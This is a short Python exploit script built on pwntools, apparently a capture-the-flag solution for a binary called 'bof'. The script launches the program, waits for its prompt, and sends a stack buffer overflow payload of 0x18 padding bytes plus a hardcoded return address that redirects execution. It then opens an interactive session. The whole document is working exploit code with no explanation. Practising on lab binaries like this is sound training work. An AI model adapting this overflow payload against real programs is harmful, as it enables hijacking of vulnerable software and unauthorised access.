from pwn import *

r = process('./bof')
r.recvuntil(';)\n')

raw_input()

magic = 0x00400607
p = 'a' * 0x18 + p64(magic)
r.send(p)


r.interactive()
